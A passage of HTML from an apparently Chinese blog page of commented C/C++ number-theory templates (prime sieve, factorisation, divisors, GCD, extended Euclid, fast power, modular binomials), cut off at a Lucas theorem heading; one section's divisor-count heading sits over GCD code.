class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 目的： 2-n的所有质数</span><br><span class="hljs-comment"> * 步骤：从2开始遍历所有小于等于n的整数，标记出合数，最终得到所有未被标记为合数的数即为质数。</span><br><span class="hljs-comment"> * 输入：一个正整数 n</span><br><span class="hljs-comment"> * 输出：输出所有小于或等于 n 的质数</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e6</span>;  <span class="hljs-comment">// 假设你要处理的最大数为 1e6，可以根据需求调整</span><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> primes[N];  <span class="hljs-comment">// 存储所有质数</span><br><span class="hljs-type">bool</span> st[N];           <span class="hljs-comment">// st[x]表示x是否被筛掉，true表示x是合数，false表示x是质数</span><br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;          <span class="hljs-comment">// 用来记录质数的个数</span><br><br><span class="hljs-comment">// 线性筛法：用来找出小于等于n的所有质数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_primes</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> n)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt++] = i;  <span class="hljs-comment">// 如果i是质数，将其记录</span><br>        <span class="hljs-comment">// 对于已知的质数，从i开始标记倍数</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j++) &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 将i的倍数标记为合数</span><br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 防止重复标记</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> n;<br><br>    <span class="hljs-comment">// 读取输入</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to find all primes less than or equal to it: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;n);  <span class="hljs-comment">// 使用scanf读取long long类型的数</span><br><br>    <span class="hljs-comment">// 调用函数获取所有质数</span><br>    get_primes(n);<br>    <br>    <span class="hljs-comment">// 输出所有质数</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Primes less than or equal to %lld are:\n&quot;</span>, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, primes[i]);  <span class="hljs-comment">// 输出质数</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-comment">// 举个简单例子：输入n=10时，程序输出 2 3 5 7</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="试除法分解质因数"><a href="#试除法分解质因数" class="headerlink" title="试除法分解质因数"></a>试除法分解质因数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 目的：该程序用于将给定整数 x 分解成其质因数，并输出每个质因数及其出现次数。</span><br><span class="hljs-comment"> * 步骤：</span><br><span class="hljs-comment"> * 1. 从 2 开始，逐步检查是否能整除 x。</span><br><span class="hljs-comment"> * 2. 如果能整除，则记录该质因数的出现次数，并不断除以该质因数直到不能整除为止。</span><br><span class="hljs-comment"> * 3. 如果剩余的 x 大于 1，说明它本身是质数，输出它。</span><br><span class="hljs-comment"> * 输入：一个长整型数 x</span><br><span class="hljs-comment"> * 输出：x 的质因数分解结果，以“质因数 次数”的形式输出。</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">divide</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> x)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i++) &#123;  <span class="hljs-comment">// 从2开始检查到sqrt(x)</span><br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 如果i能整除x</span><br>            <span class="hljs-type">int</span> s = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 记录i出现的次数</span><br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 不断除以i</span><br>                x /= i;  <span class="hljs-comment">// 将x除以i</span><br>                s++;  <span class="hljs-comment">// 增加次数</span><br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld %d\n&quot;</span>, i, s);  <span class="hljs-comment">// 输出质因数和出现次数</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld 1\n&quot;</span>, x);  <span class="hljs-comment">// 如果剩余的x是质数，输出它</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);  <span class="hljs-comment">// 输出换行</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;    <br>    <span class="hljs-comment">// 读取用户输入</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to divide: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;x);  <span class="hljs-comment">// 输入一个long long类型的整数</span><br><br>    <span class="hljs-comment">// 输出分解结果</span><br>    divide(x);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="试除法求所有因数"><a href="#试除法求所有因数" class="headerlink" title="试除法求所有因数"></a>试除法求所有因数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 目的：该算法用于找到一个整数 x 的所有正因数，并按升序排序返回。</span><br><span class="hljs-comment"> * 步骤：遍历从1到sqrt(x)，对于每个能整除x的数i，x/i也是x的因数，记录这些因数。</span><br><span class="hljs-comment"> * 输入：一个正整数 x</span><br><span class="hljs-comment"> * 输出：返回 x 的所有因数，并按升序排列。</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 返回 x 的所有正因数</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; <span class="hljs-title function_">get_divisors</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> x)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; res;  <span class="hljs-comment">// 用于存储因数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">1</span>; i &lt;= x / i; i++) &#123;  <span class="hljs-comment">// 遍历从1到sqrt(x)</span><br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 如果i能整除x</span><br>            res.push_back(i);  <span class="hljs-comment">// i 是一个因数</span><br>            <span class="hljs-keyword">if</span> (i != x / i) &#123;  <span class="hljs-comment">// 如果i和x/i不相等，x/i也是一个因数</span><br>                res.push_back(x / i);<br>            &#125;<br>        &#125;<br>    &#125;<br>    sort(res.begin(), res.end());  <span class="hljs-comment">// 按升序排列因数</span><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;<br>    <span class="hljs-comment">// 读取输入</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to find its divisors: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;x);  <span class="hljs-comment">// 使用scanf读取long long类型的数</span><br>    <span class="hljs-comment">// 获取所有因数</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; divisors = get_divisors(x);<br>    <span class="hljs-comment">// 输出所有因数</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Divisors of %lld are:\n&quot;</span>, x);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> d : divisors) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, d);  <span class="hljs-comment">// 输出每个因数</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-comment">// 举个简单例子：输入x=18时，程序输出 1 2 3 6 9 18</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="约数个数和约数之和"><a href="#约数个数和约数之和" class="headerlink" title="约数个数和约数之和"></a>约数个数和约数之和</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">如果 N = p1^c1 * p2^c2 * ... *pk^ck</span><br><span class="hljs-comment">约数个数： (c1 + 1) * (c2 + 1) * ... * (ck + 1)</span><br><span class="hljs-comment">约数之和： (p1^0 + p1^1 + ... + p1^c1) * ... * (pk^0 + pk^1 + ... + pk^ck)</span><br><span class="hljs-comment"> * 目的：该算法用于计算两个整数 a 和 b 的最大公约数（GCD）。</span><br><span class="hljs-comment"> * 步骤：使用 **辗转相除法**（也叫欧几里得算法）来计算最大公约数。该算法通过递归不断交换两个数并用模运算简化问题，直到 b 为 0，a 即为最大公约数。</span><br><span class="hljs-comment"> * 输入：两个整数 a 和 b</span><br><span class="hljs-comment"> * 输出：返回 a 和 b 的最大公约数</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 计算最大公约数（GCD）</span><br><span class="hljs-comment">// 使用辗转相除法（欧几里得算法）</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">gcd</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> a, <span class="hljs-type">long</span> <span class="hljs-type">long</span> b)</span> &#123;<br>    <span class="hljs-keyword">return</span> b ? gcd(b, a % b) : a;  <span class="hljs-comment">// 递归计算直到b为0，返回a</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a, b;<br>    <span class="hljs-comment">// 读取输入</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two numbers to find their GCD: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld %lld&quot;</span>, &amp;a, &amp;b);  <span class="hljs-comment">// 使用scanf读取long long类型的两个数</span><br>    <span class="hljs-comment">// 计算最大公约数</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> result = gcd(a, b);<br>    <span class="hljs-comment">// 输出结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The GCD of %lld and %lld is: %lld\n&quot;</span>, a, b, result);<br>    <span class="hljs-comment">// 举个简单例子：输入a=18, b=24时，程序输出 6</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="最大公约数————找到x和y"><a href="#最大公约数————找到x和y" class="headerlink" title="最大公约数————找到x和y"></a>最大公约数————找到x和y</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 扩展欧几里得算法，求解 gcd(a, b)，并且找到 x 和 y，使得 a * x + b * y = gcd(a, b)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!b) &#123;  <span class="hljs-comment">// 基本情况，b == 0 时，返回 gcd(a, b) = a</span><br>        x = <span class="hljs-number">1</span>;   <span class="hljs-comment">// 这里是 a * 1 + b * 0 = a</span><br>        y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-comment">// 递归调用，计算 exgcd(b, a % b)</span><br>    <span class="hljs-type">int</span> d = exgcd(b, a % b, y, x);  <span class="hljs-comment">// 交换 x 和 y，并递归计算 gcd(b, a % b)</span><br>    <br>    <span class="hljs-comment">// 更新 y 的值，新的 y 是递归返回的 y 减去 a / b * x</span><br>    y -= a / b * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a, b, x, y;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b;  <span class="hljs-comment">// 输入两个整数 a 和 b</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; b &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出这两个整数</span><br><br>    <span class="hljs-comment">// 调用扩展欧几里得算法</span><br>    <span class="hljs-type">int</span> d = exgcd(a, b, x, y);<br>    <span class="hljs-comment">//找到x和y</span><br>    <span class="hljs-comment">// 输出结果：a * x + b * y = gcd(a, b)</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d + %d * %d = %d\n&quot;</span>, a, x, b, y, d);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 目的：该算法用于计算 m^k mod p，即计算 m 的 k 次方模 p。</span><br><span class="hljs-comment"> * 步骤：使用 快速幂算法（Exponentiation by Squaring）来计算，时间复杂度为 O(log k)。</span><br><span class="hljs-comment"> *       通过将 k 不断右移（k &gt;&gt;= 1）并适时更新结果，避免直接计算 m 的 k 次方。</span><br><span class="hljs-comment"> * 输入：三个整数 m, k, p，分别表示底数、指数和模数。</span><br><span class="hljs-comment"> * 输出：返回 m^k mod p 的结果。</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 快速幂算法：计算 m^k mod p</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> m, <span class="hljs-type">long</span> <span class="hljs-type">long</span> k, <span class="hljs-type">long</span> <span class="hljs-type">long</span> p)</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> res = <span class="hljs-number">1</span> % p;  <span class="hljs-comment">// 初始化结果为 1 % p</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> t = m % p;    <span class="hljs-comment">// 初始化 t 为 m % p</span><br>    <span class="hljs-keyword">while</span> (k) &#123;  <span class="hljs-comment">// 当 k 不为零时</span><br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 如果 k 是奇数</span><br>            res = res * t % p;  <span class="hljs-comment">// 更新结果</span><br>        &#125;<br>        t = t * t % p;  <span class="hljs-comment">// 将 t 平方</span><br>        k &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// k 右移一位，即 k // 2</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// 返回最终结果</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> m, k, p;<br>    <span class="hljs-comment">// 读取输入</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter m, k, p: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld %lld %lld&quot;</span>, &amp;m, &amp;k, &amp;p);  <span class="hljs-comment">// 使用scanf读取long long类型的 m, k, p</span><br>    <span class="hljs-comment">// 调用函数计算 m^k mod p</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> result = qmi(m, k, p);<br>    <span class="hljs-comment">// 输出结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld^%lld mod %lld = %lld\n&quot;</span>, m, k, p, result);<br>    <span class="hljs-comment">// 举个简单例子：输入 m = 2, k = 10, p = 1000 时，程序输出 1024 mod 1000 = 24</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="通过预处理逆元的方式求组合数"><a href="#通过预处理逆元的方式求组合数" class="headerlink" title="通过预处理逆元的方式求组合数"></a>通过预处理逆元的方式求组合数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;  <span class="hljs-comment">// 假设我们取模的数是一个质数</span><br><br><span class="hljs-type">int</span> fact[MAXN], infact[MAXN];<br><br><span class="hljs-comment">// 快速幂计算：a^k % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> p)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k) &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 预处理阶乘和阶乘逆元</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">preprocess</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> p)</span> &#123;<br>    fact[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;<br>        fact[i] = (LL)fact[i<span class="hljs-number">-1</span>] * i % p;<br>    &#125;<br>    infact[n] = qmi(fact[n], p<span class="hljs-number">-2</span>, p);  <span class="hljs-comment">// 费马小定理计算逆元</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>        infact[i] = (LL)infact[i+<span class="hljs-number">1</span>] * (i+<span class="hljs-number">1</span>) % p;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 计算C(N, K) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">comb</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> K, <span class="hljs-type">int</span> p)</span> &#123;<br>    <span class="hljs-keyword">if</span> (K &lt; <span class="hljs-number">0</span> || K &gt; N) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> (LL)fact[N] * infact[K] % p * infact[N-K] % p;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> N, K;<br>    <span class="hljs-comment">// 用scanf输入N和K</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;N, &amp;K);<br>    <br>    <span class="hljs-comment">// 预处理阶乘和逆元</span><br>    preprocess(N, MOD);<br>    <br>    <span class="hljs-comment">// 输出 C(N, K) % MOD</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, comb(N, K, MOD));<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Lucas定理"><a href="#Lucas定理" class="headerlink" title="Lucas定理"></a>Lucas定理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 